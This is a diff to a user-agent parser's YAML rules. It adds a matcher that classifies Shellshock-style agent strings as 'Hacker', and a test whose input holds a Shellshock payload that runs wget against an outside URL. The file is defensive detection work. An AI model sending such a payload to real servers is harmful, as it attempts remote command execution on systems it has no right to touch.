@@ -40,6 +40,26 @@ config:
 
 - matcher:
     require:
+    - 'agent{"('''') {"'
+    extract:
+    - 'DeviceClass                 :   10000:"Hacker"'
+    - 'DeviceBrand                 :   10000:"Hacker"'
+    - 'DeviceName                  :   10000:"Hacker"'
+    - 'OperatingSystemClass        :   10000:"Hacker"'
+    - 'OperatingSystemName         :   10000:"Hacker"'
+    - 'OperatingSystemVersion      :   10000:"Hacker"'
+    - 'OperatingSystemVersionBuild :   10000:"Hacker"'
+    - 'LayoutEngineClass           :   10000:"Hacker"'
+    - 'LayoutEngineName            :   10000:"Hacker"'
+    - 'LayoutEngineVersion         :   10000:"Hacker"'
+    - 'AgentClass                  :   10000:"Hacker"'
+    - 'AgentName                   :   10000:"Hacker"'
+    - 'AgentVersion                :   10000:"Hacker"'
+    - 'HackerAttackVector          :   10000:"Shell Shock"'
+    - 'HackerToolkit               :       1:"Unknown"'
+
+- matcher:
+    require:
     - 'agent~"() {"'
     extract:
     - 'DeviceClass                 :   10000:"Hacker"'
@@ -115,6 +135,37 @@ config:
       HackerAttackVector                   : 'Shell Shock'
       HackerToolkit                        : 'Unknown'
       __SyntaxError__                      : 'true'
+
+
+- test:
+    input:
+      user_agent_string: '('''') { :;}; wget http://whsec.us/20147169/10000646/ff16d94243 #, Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1 WhiteHat Security'
+    expected:
+      DeviceClass                          : 'Hacker'
+      DeviceName                           : 'Hacker'
+      DeviceBrand                          : 'Hacker'
+      DeviceVersion                        : 'Hacker'
+      OperatingSystemClass                 : 'Hacker'
+      OperatingSystemName                  : 'Hacker'
+      OperatingSystemVersion               : 'Hacker'
+      OperatingSystemNameVersion           : 'Hacker'
+      OperatingSystemVersionBuild          : 'Hacker'
+      LayoutEngineClass                    : 'Hacker'
+      LayoutEngineName                     : 'Hacker'
+      LayoutEngineVersion                  : 'Hacker'
+      LayoutEngineVersionMajor             : 'Hacker'
+      LayoutEngineNameVersion              : 'Hacker'
+      LayoutEngineNameVersionMajor         : 'Hacker'
+      AgentClass                           : 'Hacker'
+      AgentName                            : 'Hacker'
+      AgentVersion                         : 'Hacker'
+      AgentVersionMajor                    : 'Hacker'
+      AgentNameVersion                     : 'Hacker'
+      AgentNameVersionMajor                : 'Hacker'
+      HackerAttackVector                   : 'Shell Shock'
+      HackerToolkit                        : 'Unknown'
+      __SyntaxError__                      : 'true'
+
 
 - matcher:
     require:
